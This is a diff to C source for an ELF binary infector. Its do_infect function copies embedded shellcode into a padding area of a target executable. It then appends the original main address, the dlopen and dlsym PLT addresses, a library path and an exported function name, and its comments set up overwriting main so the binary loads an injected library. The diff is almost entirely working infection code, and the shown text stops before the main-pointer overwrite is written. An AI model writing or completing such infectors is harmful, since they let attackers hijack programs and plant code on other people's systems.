@@ -55,7 +55,6 @@
 #define ELF64_R_TYPE_ID(info)         (((Elf64_Xword)(info)<<56)>>56)
 #define ELF64_R_TYPE_INFO(data, type) (((Elf64_Xword)(data)<<8) + (Elf64_Xword)(type))
 // helpful types
-
 typedef struct main_arg_t {
 	uint8_t* file_ptr;
 	size_t addr_size;
@@ -72,6 +71,10 @@ typedef struct empty_area_t {
 typedef struct plt_entry_t {
 	uint64_t vaddr;
 } plt_entry_t;
+
+// assembly stuff
+extern uint8_t SH_CODE_START;
+extern uint8_t SH_CODE_END;
 
 // static helper functions
 static void print_usage();
@@ -404,6 +407,8 @@ int do_infect(char* target_path, char* lib_path, char* exported_func) {
 	empty_area_t pad_area;
 	plt_entry_t dlopen_plt;
 	plt_entry_t dlsym_plt;
+	uint8_t* cursor;
+	uint8_t* cursor_dst;
 	
 
 	// open and map target
@@ -442,17 +447,40 @@ int do_infect(char* target_path, char* lib_path, char* exported_func) {
 	}
 	printf("Found dlsym at %lx\n", dlsym_plt.vaddr);
 
-
-	// grab the shellcode
+	// test the shellcode size
+	printf("Shellcode start %p end %p size = %ld\n", &SH_CODE_START, &SH_CODE_END, (&SH_CODE_END - &SH_CODE_START));
+	
+	if (((&SH_CODE_END - &SH_CODE_START) + 0x18 + strlen(lib_path) + strlen(exported_func)) > pad_area.size) {
+		printf("The payload is too big\n");
+		return -1;
+	}
+	
+	// copy in the payload
+	cursor_dst = pad_area.fileoffset;
+	for (cursor = &SH_CODE_START; cursor < &SH_CODE_END; cursor += 1) {
+		*cursor_dst = *cursor;
+		cursor_dst++;
+	}
 
 	// give the shellcode the needed addresses on the end, in the correct positions
 	// #1 Original Main
-	// #2 dynopen
-	// #3 dynsym
+	*((uint64_t*)cursor_dst) = (uint64_t)arg_main.main_addr;
+	cursor_dst += sizeof(uint64_t);
+	// #2 dlsym
+	*((uint64_t*)cursor_dst) = (uint64_t)dlsym_plt.vaddr;
+	cursor_dst += sizeof(uint64_t);
+	// #3 dlopen
+	*((uint64_t*)cursor_dst) = (uint64_t)dlopen_plt.vaddr;
+	cursor_dst += sizeof(uint64_t);
 	// #4 library path
+	strcpy(cursor_dst, lib_path);
+	cursor_dst += strlen(lib_path);
 	// #5 functin name
+	strcpy(cursor_dst, exported_func);
+	cursor_dst += strlen(exported_func);
 
 	// put in our new main
+	// depends on if it is a relative address or not
 
 	// overwrite original main pointer
 
